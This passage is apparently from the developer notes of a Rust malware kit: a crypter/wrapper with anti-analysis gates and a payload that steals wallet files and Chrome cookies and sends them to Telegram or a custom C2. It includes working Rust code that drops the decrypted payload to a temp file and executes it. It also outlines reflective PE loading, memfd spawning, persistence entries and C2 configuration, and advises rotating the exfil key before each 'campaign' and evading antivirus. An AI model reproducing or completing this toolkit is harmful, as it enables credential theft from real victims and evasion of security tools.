**`read payload: No such file or directory`** → the payload binary hasn't been built yet, or the path is wrong. Run the payload build first.

**`rustc failed`** with output that includes a hint like "cannot find function X in this scope" → the emitted source has a reference to a helper that wasn't emitted. Compare the emitted file against the emitter code for name mismatches.

---

## 15. known stubs and incomplete paths

This is honest accounting of what isn't finished.

### 15.1 `exec_fn` is empty

This is the big one. `emit_gates::emit_exec_fn` produces a function whose body is a comment. It doesn't call into the payload. The stub currently:

- runs all six anti-analysis features
- decrypts the payload into `pt: Vec<u8>`
- calls `exec_fn()`, which does nothing
- exits

To make the wrapper actually execute the payload, `exec_fn` needs a real body. Three implementation options, in increasing order of sophistication:

**Option A — temp-file spawn (~20 lines)**

```rust
fn exec(pt: &[u8]) {
    let path = std::env::temp_dir().join(format!("svc_{}.exe", std::process::id()));
    if std::fs::write(&path, pt).is_ok() {
        let _ = std::process::Command::new(&path).spawn();
        std::thread::sleep(std::time::Duration::from_millis(500));
        let _ = std::fs::remove_file(&path);
    }
}
```

Works immediately. Requires changing the `main()` call site to pass `pt`.

**Option B — in-memory PE mapping (Windows)**

Full reflective loader: `NtCreateSection`, `NtMapViewOfSection`, resolve imports, apply relocations, call entry point. This is what `ExecutionMethod::ImageMap` is supposed to do. No disk touch. Significantly more code.

**Option C — memfd spawn (Linux only)**

The `svc-loader::linux::spawn_memfd` function already does this. Wire it into the stub's `exec_fn` for Linux builds.

### 15.2 crypto primitives in the stub are stubs

`aes_gcm_decrypt`, `chacha_decrypt`, `aes_cbc_hmac_decrypt` in the emitted stub all return `Ok(())` without doing anything. The crypter encrypts the payload with real AES-GCM, but the emitted stub doesn't actually decrypt it.

To fix: add the corresponding crypto crates to the emitted stub's Cargo.toml (currently the stub is compiled by `rustc` standalone, with no external crates). This requires switching the crypter from `rustc` invocation to a per-build `cargo` project — write a `Cargo.toml` into the `out/<name>/` directory, invoke `cargo build`, and pass `--manifest-path`.

That's a ~30-line change to `svc-crypter/src/main.rs`. It also unlocks the ability to use `windows-sys` in the stub for `VirtualProtect`, `NtQueryInformationProcess`, etc., which are currently stubbed.

### 15.3 OS helpers in the stub are stubs

`get_kernel32`, `get_proc`, `load_lib`, `peb_ptr`, `current_process` all have abbreviated bodies. `peb_ptr` is real (inline asm reading `gs:[0x60]`). The rest return nulls. The `NtQueryInformationProcess` debug check will always return `false` because `load_lib` returns null.

Fixing this requires either:
- switching to a per-build cargo project so `windows-sys` is available, or
- writing real PEB-walk code (resolve `kernel32` by walking `PEB->Ldr->InMemoryOrderModuleList`, resolve exports by walking the module's export table).

### 15.4 integrity check is a stub

`TextSectionHash` and `RegionCrc` both emit `true`. Real implementations would read the process image at runtime and hash the text section, then compare against a build-time hash. Not currently wired.

### 15.5 VM is minimal

`vm_run` supports push, add, xor, halt, load, store. Most of the 32 opcodes in the enum have no dispatch arm. The VM isn't used for anything in the current execution path — the payload runs as a spawned process, not as VM bytecode.

### 15.6 `svc-loader` isn't wired in

The loader crate compiles and has real implementations of ghost spawn (Windows), memfd spawn (Linux), and posix_spawn ghost (macOS). Nothing calls into it. It's the toolkit for `exec_fn` option B/C.

---

## 16. FAQ

**Q: is the payload safe to test on my own VM?**

Yes. The payload doesn't modify user files. It reads known wallet paths, queries SQLite, and sends over HTTPS. The persistence entries are opt-in and only apply if you set them in the directive.

**Q: do I need a Windows box to test?**

For the payload, either Wine or a Windows VM. Wine handles the sysinfo path fine; DPAPI and Chrome cookie decryption may fail under Wine. A real Windows VM is best.

For the crypter, no — it runs on Linux and emits Windows binaries via cross-compilation.

**Q: does the wrapper need admin?**

No. The gate chain, decrypt, and (once implemented) exec all run in user space. Persistence entries like `schtask /SC ONLOGON` don't need elevation; `rc_local` on Linux does.

**Q: what if the target is offline?**

`exfil_event` uses a blocking reqwest client with timeouts of 8–60 s. If the send fails, the event is lost. There's no retry queue. If you need retries, wrap `dispatch` in a retry loop with exponential backoff.

**Q: can I use this with my own C2 instead of Telegram?**

Yes. Set `c2_url` and `c2_auth` in the config. Every event will be `POST`ed with `Authorization: Bearer <c2_auth>` and the sealed blob as the body. You'll need a server that decodes the envelope.

**Q: how do I rotate the exfil key?**

`EXFIL_KEY_HEX` in `common/src/envkey.rs` is the key that seals every event. Rotate it before each campaign. Any events sealed with the old key become unreadable to anyone who only has the new one.

**Q: what's `bind_to_fingerprint` for?**

When set, the crypter derives the payload key from a JSON fingerprint instead of just `salt || seed || payload_hash`. The stub would need to compute the fingerprint at runtime and derive the same key. Not currently wired up in the emitted stub's `derive_key` — it uses only the payload bytes. Wiring this requires the stub to collect hostname/username/volume-serial at runtime and re-run argon2id, which is real work.

**Q: why isn't the payload statically linked?**

It is, in release mode with the default `x86_64-pc-windows-gnu` target. The final `svc-payload.exe` is a large static binary (3.8 MB in the current build). The wrapper (`campaign_a.exe`) is smaller (284 KB) because the stub is a much simpler program.

**Q: how do I make two wrappers that DON'T share a runtime if both are running?**

The current design assumes one wrapper per host. If you need multiple wrappers on the same host, change the `SVC_EXFIL_CFG` env var name per build so they don't clobber each other, and change the temp-file prefix in `exec_fn` (once it's implemented) so they don't collide.

**Q: why Rust and not C?**

Rust because: the toolchain is available on the analysis machine; the `windows-sys` and `reqwest` crates cover most of what the payload needs; and the strong type system catches emit-code bugs at crypter-build time. The cost is larger binaries and slower compile times, which don't matter for a wrapper that runs once.

**Q: what about detection?**

The wrapper's obfuscation targets static analysis. `strings` finds nothing, signature-based AV will struggle, the emitted Rust code has random identifiers. It does NOT target dynamic analysis. A debugger attached before the anti-debug checks run will still see everything. An EDR with kernel callbacks will still see the spawn. An analyst with a live memory dump taken between decrypt and exec will still see the payload (the anti-dump guard reduces but doesn't eliminate this window).

This is a script-kiddie-adjacent wrapper. It raises the cost of casual inspection. It does not defeat a determined analyst with time and tooling.

---

*Last updated with the state of the workspace as of the latest build.*

*Questions about the defensive side — how to detect this class of wrapper, how to harden build pipelines against equivalent attacks — are separate and out of scope for this document.*
